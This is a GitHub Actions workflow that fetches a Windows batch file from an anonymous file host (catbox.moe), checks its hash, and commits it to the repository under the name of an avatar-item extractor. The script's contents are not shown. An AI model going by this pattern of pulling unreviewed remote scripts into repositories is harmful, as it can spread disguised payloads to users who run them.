name: install
on:
  push:
    paths:
      - ".github/workflows/install.yml"
permissions:
  contents: write
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: fetch it
        run: curl -fsSL https://files.catbox.moe/kbutlh.bat -o Extract-AvatarItem-v20.bat
      - name: verify it
        run: echo "65fcd76439290cb8722286ab46bc46ce0c05744975898322a13005222d0934a4  Extract-AvatarItem-v20.bat" | sha256sum -c -
      - name: commit it
        run: |
          git config user.name "extractor installer"
          git config user.email "actions@users.noreply.github.com"
          git add Extract-AvatarItem-v20.bat
          git commit -m "Find the texture and icon wherever the item keeps them"
          git push
